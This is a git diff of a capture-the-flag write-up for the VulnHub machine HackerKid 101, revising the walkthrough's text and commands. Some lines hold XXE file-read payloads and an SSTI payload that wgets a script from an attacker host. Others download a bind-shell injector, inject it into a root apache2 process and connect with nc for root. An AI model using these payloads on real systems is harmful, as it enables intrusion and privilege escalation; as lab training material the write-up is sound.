@@ -8,7 +8,7 @@ tags: ctf vulnhub hackerkid
 Hello all. We have another day and another vuln machine to crack.
 Today we are looking at [HackerKid 101](https://www.vulnhub.com/entry/hacker-kid-101,719/) (Medium difficulty) from an Author we have checked out before Saket Sourav. :)
 
-Also make sure to check out the [VOD](https://www.youtube.com/channel/UCBE5zF0VuDwn2-cAMNBJvkA) on youtube if you missed the livestream. :)
+Also make sure to check out the [VOD](https://www.youtube.com/watch?v=Z-35msH3ysw) on youtube if you missed the livestream. :)
 
 ## Prep:
 - Get your VMs a running (Kali and _the target_)
@@ -289,14 +289,10 @@ systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
 bind:x:126:133::/var/cache/bind:/usr/sbin/nologin
 ```
 Looks like there is only one user - saket.
-Because we are working with data over the web, URL encoding and encoding in general can play havok with our attempts to include files. So looking further down the XXE reference page there are some handy PHP wrappers that will base64 encode file contents for us.
+Because we are working with data over the web, URL encoding and encoding in general can play havok with our attempts to include files. So looking further down the XXE reference page there are some handy PHP wrappers that will base64 encode file contents for us and even potentially run PHP code.
 
 ```
-<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
-```
-even potentially run PHP code.
-```
-<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]
+<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php"> ]>
 ```
 
 So we went fuck it and took a linux LFI cheatsheet list from [github](https://github.com/hussein98d/LFI-files/blob/master/list.txt), did some magic to it, `replaced [USERNAME] with saket, replaced the /root ones with /home/saket/ because ~ wont work`, and dumped it into a sniper intruder and just let it run. Eventually we got back some results.
@@ -410,28 +406,31 @@ Lets check for any processes running as root.
 ps -eaf
 ```
 
-We randomly seem to have an apache2 instance running as root (process id 945)
+Be careful with what process you pick as it could mess with your box. We found an apache2 instance running as root (for our check it was process id 945). This is great cause it will only mess with the apache process and not any system ones.
 
 ```
 root         945       1  0 07:37 ?        00:00:01 /usr/sbin/apache2 -k start
 ```
 
-According to the article we need to spin up a BIND shell. so lets go look one up..
+According to the article we need to spin up a BIND shell, so lets go look one up..
+[BIND shell gist](https://gist.githubusercontent.com/wifisecguy/1d69839fe855c36a1dbecca66948ad56/raw/e919439010bbabed769d86303ff18ffbacdaecfd/inject.py)
+This one will work, only needs the PID passed in as an arg and will allow us to connect via port 5600.
 
-On kali lets get that BIND shell downloaded and ready to add to our target.
 
 ```
-wget https://gist.githubusercontent.com/wifisecguy/1d69839fe855c36a1dbecca66948ad56/raw/e919439010bbabed769d86303ff18ffbacdaecfd/inject.py -O exploit.py
+touch exploit.py
+vim exploit.py
+```
+Create the local python file and paste in the code from github.
+
+Now we make sure that python server is still running and jump back to the shell we have on the target.
+To copy it over its a simple wget.
+
+```
+wget http://<attacker>:8000/exploit.py -O /tmp/exploit.py
 ```
 
-Then use our SSTI to run wget and download the `exploit.py` to `/tmp/exploit.py` on our target.
-{% raw %}
-```
-http://hackerkid.blackhat.local:9999/?name={%import%20os%}{{os.popen(%22wget%20http://<attacker>:8000/exploit.py%20-O%20/tmp/exploit.py%22).read()}}
-```
-{% endraw %}
-
-And now we jump back into our reverse shell and lets run that python exploit file.
+And now we run that python exploit file. Just to note, we need to pass in the PID we found of an appropriate service to exploit.py.
 
 ```
 saket@ubuntu:/tmp$ which python
@@ -452,7 +451,7 @@ Shellcode Injected!!
 Final Instruction Pointer: 0x7fe67d2040dcL
 ```
 
-Check locally to see if there is now something listening on port 5600
+Now that its injected, we need to check locally to see if there is now something listening on port 5600
 
 ```
 saket@ubuntu:/tmp$ netstat -anlp
@@ -472,7 +471,7 @@ BOOOM
 Now lets connect and see what happens
 
 ```
-c -nv $TARGETIP 5600
+nc -nv $TARGETIP 5600
 (UNKNOWN) [192.168.1.165] 5600 (?) open
 whoami
 root
